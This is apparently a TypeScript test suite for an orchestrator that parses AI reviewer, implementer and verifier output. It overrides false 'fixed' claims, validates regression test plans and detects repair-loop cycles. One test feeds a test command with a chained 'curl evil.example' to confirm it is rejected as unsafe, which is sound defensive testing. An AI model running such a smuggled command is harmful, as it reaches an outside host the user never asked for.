import assert from "node:assert/strict";
import { test } from "node:test";
import {
  actionableFingerprint,
  annotateFindings,
  buildRepairTask,
  extractJsonArray,
  parseFixVerdicts,
  parseRegressionPlans,
  partitionApplyBatches,
  scopeAcceptedFindings,
} from "../src/orchestrator.ts";
import type {
  FileChangeEvidence,
  FileChangeState,
  Finding,
  SelfReport,
  VerificationRound,
} from "../src/types.ts";

const finding = (overrides: Partial<Finding> = {}): Finding => ({
  reviewer: "Security Engineer",
  file: "src/a.ts",
  line: 12,
  category: "security",
  severity: "high",
  rationale: "unsanitized input reaches exec",
  suggestedChange: "escape the argument",
  ...overrides,
});

const annotated = (rec: string, reason?: string, overrides: Partial<Finding> = {}) => ({
  ...finding(overrides),
  recommendation: rec,
  ...(reason ? { recommendationReason: reason } : {}),
});

// ── extractJsonArray ───────────────────────────────────────────────────────

test("extractJsonArray parses a bare JSON array", () => {
  const result = extractJsonArray('[{"a":1},{"b":2}]');
  assert.deepEqual(result, [{ a: 1 }, { b: 2 }]);
});

test("extractJsonArray parses arrays wrapped in prose and code fences", () => {
  const fenced = "Here are my recommendations:\n```json\n[{\"a\":1}]\n```\nDone.";
  assert.deepEqual(extractJsonArray(fenced), [{ a: 1 }]);

  const prose = "Analysis complete. [ {\"a\": 1} ] That is all.";
  assert.deepEqual(extractJsonArray(prose), [{ a: 1 }]);
});

test("extractJsonArray falls back to JSON-lines objects", () => {
  const lines = '{"a":1}\nnot json\n{"b":2}';
  assert.deepEqual(extractJsonArray(lines), [{ a: 1 }, { b: 2 }]);
});

test("extractJsonArray returns null for unusable text", () => {
  assert.equal(extractJsonArray("no structured data here"), null);
});

// ── annotateFindings ───────────────────────────────────────────────────────

test("annotateFindings merges recommendations onto matching findings", () => {
  const base = [finding(), finding({ file: "src/b.ts", line: 3, category: "bug" })];
  const output = JSON.stringify([
    annotated("apply"),
    annotated("defer", "risky hot path", { file: "src/b.ts", line: 3, category: "bug" }),
  ]);

  const { findings, note } = annotateFindings(base, [output]);
  assert.equal(note, undefined);
  assert.equal(findings[0]?.recommendation, "apply");
  assert.equal(findings[0]?.recommendationReason, undefined);
  assert.equal(findings[1]?.recommendation, "defer");
  assert.equal(findings[1]?.recommendationReason, "risky hot path");
});

test("annotateFindings notes partially-annotated results and keeps unmatched findings intact", () => {
  const base = [finding(), finding({ file: "src/b.ts", line: 3, category: "bug" })];
  const output = JSON.stringify([annotated("reject", "false positive")]);

  const { findings, note } = annotateFindings(base, [output]);
  assert.equal(findings[0]?.recommendation, "reject");
  assert.equal(findings[0]?.recommendationReason, "false positive");
  assert.equal(findings[1]?.recommendation, undefined);
  assert.ok(note?.includes("1/2"));
});

test("annotateFindings ignores invalid recommendation values and tries later texts", () => {
  const base = [finding()];
  const bad = JSON.stringify([annotated("maybe")]);
  const good = JSON.stringify([annotated("defer", "needs investigation")]);

  // invalid recommendation value → no annotation from first text
  const first = annotateFindings(base, [bad]);
  assert.equal(first.findings[0]?.recommendation, undefined);

  // empty first text is skipped, second text parsed
  const second = annotateFindings(base, ["", good]);
  assert.equal(second.findings[0]?.recommendation, "defer");
});

// ── parseFixVerdicts ──────────────────────────────────────────────────

function evidenceFor(entries: Record<string, FileChangeState | FileChangeEvidence>): Map<string, FileChangeEvidence> {
  return new Map(
    Object.entries(entries).map(([file, value]) => [
      file,
      typeof value === "string" ? { file, state: value } : value,
    ]),
  );
}

const verdict = (file: string, line: number, category: string, v: string, evidence = "because") => ({
  file,
  line,
  category,
  verdict: v,
  evidence,
});

test("parseFixVerdicts merges agent verdicts onto changed files", () => {
  const accepted = [finding(), finding({ file: "src/b.ts", line: 3, category: "bug" })];
  const evidence = evidenceFor({ "src/a.ts": "changed", "src/b.ts": "created" });
  const output = JSON.stringify([
    verdict("src/a.ts", 12, "security", "fixed", "escapes argv before execFile"),
    verdict("src/b.ts", 3, "bug", "partial", "one of three call sites"),
  ]);

  const { verifications, note } = parseFixVerdicts(accepted, evidence, new Map(), [output]);
  assert.equal(note, undefined);
  assert.equal(verifications[0]?.verdict, "fixed");
  assert.equal(verifications[0]?.evidence, "escapes argv before execFile");
  assert.equal(verifications[0]?.changed, "changed");
  assert.equal(verifications[1]?.verdict, "partial");
});

test("parseFixVerdicts overrides the agent when the file never changed", () => {
  const accepted = [finding()];
  const evidence = evidenceFor({ "src/a.ts": "unchanged" });
  const output = JSON.stringify([verdict("src/a.ts", 12, "security", "fixed", "looks great to me")]);

  const { verifications } = parseFixVerdicts(accepted, evidence, new Map(), [output]);
  assert.equal(verifications[0]?.verdict, "not-fixed");
  assert.match(verifications[0]?.evidence ?? "", /byte-identical/);
});

test("parseFixVerdicts marks every changed finding unverifiable when output is unparsable", () => {
  const accepted = [finding()];
  const evidence = evidenceFor({ "src/a.ts": "changed" });

  const { verifications, note } = parseFixVerdicts(accepted, evidence, new Map(), ["the verifier rambled"]);
  assert.equal(verifications[0]?.verdict, "cannot-verify");
  assert.ok(note?.includes("unparsable"));
});

test("parseFixVerdicts notes partial coverage and defaults the rest to cannot-verify", () => {
  const accepted = [finding(), finding({ file: "src/b.ts", line: 3, category: "bug" })];
  const evidence = evidenceFor({ "src/a.ts": "changed", "src/b.ts": "changed" });
  const output = JSON.stringify([verdict("src/a.ts", 12, "security", "fixed")]);

  const { verifications, note } = parseFixVerdicts(accepted, evidence, new Map(), [output]);
  assert.equal(verifications[0]?.verdict, "fixed");
  assert.equal(verifications[1]?.verdict, "cannot-verify");
  assert.ok(note?.includes("1/2"));
});

test("parseFixVerdicts reports an unreadable target file with its read detail", () => {
  const accepted = [finding()];
  const evidence = evidenceFor({
    "src/a.ts": { file: "src/a.ts", state: "unreadable", detail: "path escapes the project root" },
  });

  const { verifications } = parseFixVerdicts(accepted, evidence, new Map(), ["[]"]);
  assert.equal(verifications[0]?.verdict, "cannot-verify");
  assert.equal(verifications[0]?.evidence, "path escapes the project root");
});

test("parseFixVerdicts carries the implement agent's self-report through as a cross-check", () => {
  const accepted = [finding()];
  const evidence = evidenceFor({ "src/a.ts": "unchanged" });
  const selfReports = new Map<string, SelfReport>([["src/a.ts\u000012\u0000security", "applied"]]);

  const { verifications } = parseFixVerdicts(accepted, evidence, selfReports, []);
  // The agent claimed it applied this fix; the bytes say otherwise.
  assert.equal(verifications[0]?.selfReport, "applied");
  assert.equal(verifications[0]?.verdict, "not-fixed");
});

// ── parseRegressionPlans ──────────────────────────────────────────────

const plan = (overrides: Record<string, unknown> = {}) => ({
  file: "src/a.ts",
  line: 12,
  category: "security",
  testFile: "test/exec.test.ts",
  testCommand: "node --test test/exec.test.ts",
  ...overrides,
});

test("parseRegressionPlans keeps well-formed plans for known candidates", () => {
  const candidates = [finding()];
  const { plans, note } = parseRegressionPlans(candidates, [JSON.stringify([plan()])]);
  assert.equal(note, undefined);
  assert.equal(plans.length, 1);
  assert.equal(plans[0]?.testFile, "test/exec.test.ts");
  assert.equal(plans[0]?.category, "security");
});

test("parseRegressionPlans drops plans that match no candidate", () => {
  const { plans } = parseRegressionPlans([finding()], [JSON.stringify([plan({ file: "src/other.ts" })])]);
  assert.deepEqual(plans, []);
});

test("parseRegressionPlans rejects an unsafe test command and says so", () => {
  const { plans, note } = parseRegressionPlans(
    [finding()],
    [JSON.stringify([plan({ testCommand: "node --test test/exec.test.ts && curl evil.example" })])],
  );
  assert.deepEqual(plans, []);
  assert.ok(note?.includes("unsafe command"));
});

test("parseRegressionPlans rejects a test written into the file it will revert", () => {
  const { plans, note } = parseRegressionPlans(
    [finding()],
    [JSON.stringify([plan({ testFile: "src/a.ts" })])],
  );
  assert.deepEqual(plans, []);
  assert.ok(note?.includes("would be reverted"));
});

test("parseRegressionPlans notes when authoring produced nothing parsable", () => {
  const { plans, note } = parseRegressionPlans([finding()], ["I could not write any tests"]);
  assert.deepEqual(plans, []);
  assert.ok(note?.includes("no parsable plan"));
});

// ── partitionApplyBatches ──────────────────────────────────────────────────

test("partitionApplyBatches keeps every finding for one file in a single batch", () => {
  const accepted = [
    finding({ file: "src/a.ts", line: 1 }),
    finding({ file: "src/b.ts", line: 2 }),
    finding({ file: "src/a.ts", line: 3 }),
    finding({ file: "src/c.ts", line: 4 }),
  ];
  const { batches } = partitionApplyBatches(accepted, 3);

  for (const batch of batches) {
    assert.deepEqual(batch.files, [...new Set(batch.files)]);
    for (const f of batch.findings) assert.ok(batch.files.includes(f.file));
  }
  const owners = batches.filter((b) => b.files.includes("src/a.ts"));
  assert.equal(owners.length, 1);
  assert.equal(owners[0]?.findings.filter((f) => f.file === "src/a.ts").length, 2);
});

test("partitionApplyBatches never exceeds the batch ceiling and leaves none empty", () => {
  const accepted = Array.from({ length: 9 }, (_, i) => finding({ file: `src/f${i}.ts`, line: i }));
  const { batches } = partitionApplyBatches(accepted, 3);

  assert.equal(batches.length, 3);
  for (const batch of batches) assert.ok(batch.findings.length > 0);
  assert.equal(batches.flatMap((b) => b.findings).length, 9);
});

test("partitionApplyBatches collapses to one batch when a single file owns everything", () => {
  const accepted = [
    finding({ file: "src/a.ts", line: 1 }),
    finding({ file: "src/a.ts", line: 2 }),
  ];
  const { batches, overflow } = partitionApplyBatches(accepted, 3);

  assert.equal(batches.length, 1);
  assert.equal(batches[0]?.findings.length, 2);
  assert.deepEqual(overflow, []);
});

test("partitionApplyBatches caps at 40 fixes and returns the rest as overflow", () => {
  const accepted = Array.from({ length: 45 }, (_, i) =>
    finding({ file: `src/f${i}.ts`, line: i, category: i < 40 ? "security" : "style" }),
  );
  const { batches, overflow } = partitionApplyBatches(accepted, 3);

  assert.equal(batches.flatMap((b) => b.findings).length, 40);
  assert.equal(overflow.length, 5);
  for (const f of overflow) assert.equal(f.category, "style");
});

test("partitionApplyBatches ranks by category, then severity, then blast radius", () => {
  const accepted = [
    finding({ file: "src/style.ts", category: "style", severity: "critical" }),
    finding({ file: "src/sec-low.ts", category: "security", severity: "low" }),
    finding({ file: "src/sec-crit-big.ts", category: "security", severity: "critical", suggestedChange: "a\nb\nc" }),
    finding({ file: "src/sec-crit-small.ts", category: "security", severity: "critical", suggestedChange: "a" }),
  ];
  // 3 security + 37 bug fills the cap exactly, so the style finding is the one
  // ranked out regardless of its critical severity.
  const { overflow } = partitionApplyBatches(
    [...accepted, ...Array.from({ length: 37 }, (_, i) => finding({ file: `src/pad${i}.ts`, category: "bug" }))],
    1,
  );
  assert.deepEqual(overflow.map((f) => f.file), ["src/style.ts"]);
});

// ── buildRepairTask ───────────────────────────────────────────

const round = (overrides: Partial<VerificationRound> = {}): VerificationRound => ({
  round: 1,
  status: "failed",
  fixVerdicts: [],
  regressions: [],
  scripts: [],
  notes: [],
  ...overrides,
});

const fixVerification = (
  file: string,
  line: number,
  category: Finding["category"],
  verdictValue: "fixed" | "partial" | "not-fixed" | "cannot-verify",
  changed: FileChangeState,
  selfReport: SelfReport = "applied",
  evidence = "because",
) => ({ file, line, category, verdict: verdictValue, evidence, changed, selfReport });

test("buildRepairTask returns an empty task when nothing is actionable", () => {
  const empty = buildRepairTask(
    "/repo",
    round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "fixed", "changed")] }),
    [finding()],
    [],
  );
  assert.equal(empty.task, "");
  assert.equal(empty.targetCount, 0);
});

test("buildRepairTask includes not-fixed, partial, and judgeable cannot-verify verdicts", () => {
  const accepted = [
    finding({ file: "src/a.ts", line: 12, category: "security" }),
    finding({ file: "src/b.ts", line: 3, category: "bug" }),
    finding({ file: "src/c.ts", line: 7, category: "performance" }),
  ];
  const fixVerdicts = [
    fixVerification("src/a.ts", 12, "security", "not-fixed", "unchanged"),
    fixVerification("src/b.ts", 3, "bug", "partial", "changed"),
    fixVerification("src/c.ts", 7, "performance", "cannot-verify", "changed"),
  ];
  const { task, targetCount } = buildRepairTask("/repo", round({ fixVerdicts }), accepted, ["src/a.ts"]);
  assert.equal(targetCount, 3);
  assert.match(task, /src\/a\.ts/);
  assert.match(task, /src\/b\.ts/);
  assert.match(task, /src\/c\.ts/);
});

test("buildRepairTask excludes cannot-verify on an unreadable file", () => {
  const accepted = [finding({ file: "src/a.ts", line: 12, category: "security" })];
  const fixVerdicts = [fixVerification("src/a.ts", 12, "security", "cannot-verify", "unreadable")];
  const { task, targetCount } = buildRepairTask("/repo", round({ fixVerdicts }), accepted, []);
  assert.equal(targetCount, 0);
  assert.equal(task, "");
});

test("buildRepairTask carries non-discriminating regressions and failed scripts as targets", () => {
  const r = round({
    fixVerdicts: [fixVerification("src/a.ts", 12, "security", "fixed", "changed")],
    regressions: [
      {
        file: "src/a.ts",
        line: 12,
        category: "security",
        testFile: "test/a.test.ts",
        testCommand: "node --test test/a.test.ts",
        outcome: "not-discriminating",
        greenAfterFix: true,
        redWhenReverted: false,
        proven: false,
      },
    ],
    scripts: [
      { script: "test", command: "npm run test", status: "fail", exitCode: 1, relevantOutput: "1 failing" },
    ],
  });
  const { task, targetCount } = buildRepairTask("/repo", r, [finding()], []);
  assert.equal(targetCount, 2);
  assert.match(task, /not-discriminating/);
  assert.match(task, /npm run test/);
});

test("buildRepairTask passes already-fixed findings as read-only context, not as targets", () => {
  const accepted = [
    finding({ file: "src/a.ts", line: 12, category: "security" }),
    finding({ file: "src/b.ts", line: 3, category: "bug" }),
  ];
  const fixVerdicts = [
    fixVerification("src/a.ts", 12, "security", "fixed", "changed"),
    fixVerification("src/b.ts", 3, "bug", "not-fixed", "unchanged"),
  ];
  const { task, targetCount } = buildRepairTask("/repo", round({ fixVerdicts }), accepted, []);
  assert.equal(targetCount, 1);
  assert.match(task, /Already-Fixed Findings/);
});

// ── actionableFingerprint (repair-loop stagnation signal) ─────────────────

const nonProvenRegression = (file: string, line: number, category: Finding["category"], outcome = "not-discriminating") => ({
  file,
  line,
  category,
  testFile: `test/${file.replace(/\W/g, "_")}.test.ts`,
  testCommand: "node --test",
  outcome: outcome as "not-discriminating",
  greenAfterFix: true,
  redWhenReverted: false,
  proven: false,
});

test("actionableFingerprint is empty exactly when buildRepairTask has no target", () => {
  const clean = round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "fixed", "changed")] });
  assert.equal(actionableFingerprint(clean), "");
  assert.equal(buildRepairTask("/repo", clean, [finding()], []).targetCount, 0);

  const unreadable = round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "cannot-verify", "unreadable")] });
  assert.equal(actionableFingerprint(unreadable), "", "an unreadable cannot-verify is not repairable, so it does not fingerprint");
  assert.equal(buildRepairTask("/repo", unreadable, [finding()], []).targetCount, 0);
});

test("actionableFingerprint is order-independent across all three failure groups", () => {
  const forward = round({
    fixVerdicts: [
      fixVerification("src/a.ts", 12, "security", "not-fixed", "unchanged"),
      fixVerification("src/b.ts", 3, "bug", "partial", "changed"),
    ],
    regressions: [nonProvenRegression("src/c.ts", 7, "performance")],
    scripts: [{ script: "test", command: "npm run test", status: "fail", exitCode: 1, relevantOutput: "x" }],
  });
  const reversed = round({
    fixVerdicts: [
      fixVerification("src/b.ts", 3, "bug", "partial", "changed"),
      fixVerification("src/a.ts", 12, "security", "not-fixed", "unchanged"),
    ],
    regressions: [nonProvenRegression("src/c.ts", 7, "performance")],
    scripts: [{ script: "test", command: "npm run test", status: "fail", exitCode: 1, relevantOutput: "x" }],
  });
  assert.equal(actionableFingerprint(forward), actionableFingerprint(reversed));
});

test("actionableFingerprint reads a verdict improvement as progress, not stagnation", () => {
  const before = round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "not-fixed", "unchanged")] });
  const after = round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "partial", "changed")] });
  assert.notEqual(actionableFingerprint(before), actionableFingerprint(after));
});

test("actionableFingerprint matches when the same failure recurs, and detects an A→B→A cycle", () => {
  const a = () => round({ fixVerdicts: [fixVerification("src/a.ts", 12, "security", "not-fixed", "unchanged")] });
  const b = () => round({ fixVerdicts: [fixVerification("src/b.ts", 3, "bug", "not-fixed", "unchanged")] });
  assert.equal(actionableFingerprint(a()), actionableFingerprint(a()), "an unchanged failure set fingerprints identically");

  const seen = new Set<string>([actionableFingerprint(a())]);
  const fpB = actionableFingerprint(b());
  assert.equal(seen.has(fpB), false, "a different failure set is new");
  seen.add(fpB);
  assert.equal(seen.has(actionableFingerprint(a())), true, "returning to an earlier failure set is caught as a cycle");
});

test("actionableFingerprint distinguishes a failed script from a green one", () => {
  const failing = round({
    fixVerdicts: [fixVerification("src/a.ts", 12, "security", "fixed", "changed")],
    scripts: [{ script: "lint", command: "npm run lint", status: "fail", exitCode: 1, relevantOutput: "e" }],
  });
  const passing = round({
    fixVerdicts: [fixVerification("src/a.ts", 12, "security", "fixed", "changed")],
    scripts: [{ script: "lint", command: "npm run lint", status: "pass", exitCode: 0, relevantOutput: "" }],
  });
  assert.equal(actionableFingerprint(failing), "script:lint");
  assert.equal(actionableFingerprint(passing), "");
});

test("partitionApplyBatches returns no batches when nothing was accepted", () => {
  const { batches, overflow } = partitionApplyBatches([], 3);
  assert.deepEqual(batches, []);
  assert.deepEqual(overflow, []);
});

// ── scopeAcceptedFindings ──────────────────────────────────────────────────

test("scopeAcceptedFindings separates findings the run never audited", () => {
  const audited = finding({ file: "src/a.ts" });
  const stray = finding({ file: "../outside/evil.ts" });
  const vendored = finding({ file: "vendor/gen.js", line: -1 });

  const { inScope, outOfScope } = scopeAcceptedFindings(
    [audited, stray, vendored],
    ["src/a.ts", "src/b.ts"],
  );

  assert.deepEqual(inScope, [audited]);
  assert.deepEqual(outOfScope, [stray, vendored]);
});

test("scopeAcceptedFindings empties the accepted set when nothing is in scope", () => {
  // The caller re-tests emptiness after this, which is what routes a fully
  // out-of-scope run to the none-accepted report instead of an empty implement.
  const stray = finding({ file: "../outside/evil.ts" });
  const { inScope, outOfScope } = scopeAcceptedFindings([stray], ["src/a.ts"]);

  assert.deepEqual(inScope, []);
  assert.deepEqual(outOfScope, [stray]);
});

test("scopeAcceptedFindings drops nothing when every file was audited", () => {
  const a = finding({ file: "src/a.ts" });
  const b = finding({ file: "src/b.ts" });
  const { inScope, outOfScope } = scopeAcceptedFindings([a, b], ["src/a.ts", "src/b.ts"]);

  assert.deepEqual(inScope, [a, b]);
  assert.deepEqual(outOfScope, []);
});

test("scopeAcceptedFindings treats an empty manifest as auditing nothing", () => {
  const { inScope, outOfScope } = scopeAcceptedFindings([finding()], []);
  assert.equal(inScope.length, 0);
  assert.equal(outOfScope.length, 1);
});
